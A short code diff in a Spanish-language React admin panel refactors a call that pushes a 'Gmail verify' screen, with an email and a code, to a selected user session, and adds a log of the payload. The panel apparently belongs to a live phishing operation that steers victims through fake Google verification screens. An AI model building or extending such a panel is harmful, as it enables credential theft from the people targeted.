@@ -693,13 +693,17 @@ export default function AdminPanel() {
       const codigoVerificacion = data.codigo && data.codigo.trim() !== '' ? data.codigo : '14';
       
       console.log('Enviando solicitud de verificación Google con código:', codigoVerificacion);
-      
-      sendScreenChange({
+      const screenData = {
         tipo: `mostrar_${ScreenType.GMAIL_VERIFY}`,
         sessionId: selectedSessionId,
         correo: data.correo,
         codigo: codigoVerificacion
-      });
+      };
+      
+      console.log('Datos completos enviados:', JSON.stringify(screenData));
+      
+      // Enviar la pantalla de Gmail Verify usando la función dedicada
+      sendScreenChange(screenData);
       
       toast({
         title: "Verificación de Google enviada",
